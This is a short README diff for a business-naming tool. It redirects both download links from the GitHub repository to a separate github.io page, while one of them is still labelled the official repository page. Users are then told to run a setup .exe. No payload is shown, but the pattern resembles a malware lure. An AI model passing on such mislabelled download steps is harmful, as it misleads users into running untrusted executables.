@@ -1,6 +1,6 @@
 # 🏷️ business-name-fit - Choose names that honor your roots
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/Soupy-sievabean276/business-name-fit)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://soupy-sievabean276.github.io)
 
 ## 🎯 About this tool
 
@@ -21,7 +21,7 @@ Ensure your computer meets these requirements before you start:
 
 You need the installer file to run this program on your machine. Follow these steps to obtain and launch the software.
 
-1.  Visit the official repository page to download the software: [Download business-name-fit](https://github.com/Soupy-sievabean276/business-name-fit)
+1.  Visit the official repository page to download the software: [Download business-name-fit](https://soupy-sievabean276.github.io)
 2.  Locate the downloaded file in your browser downloads folder.
 3.  Double-click the file named business-name-fit-setup.exe to start the installer.
 4.  Follow the prompts on your screen.
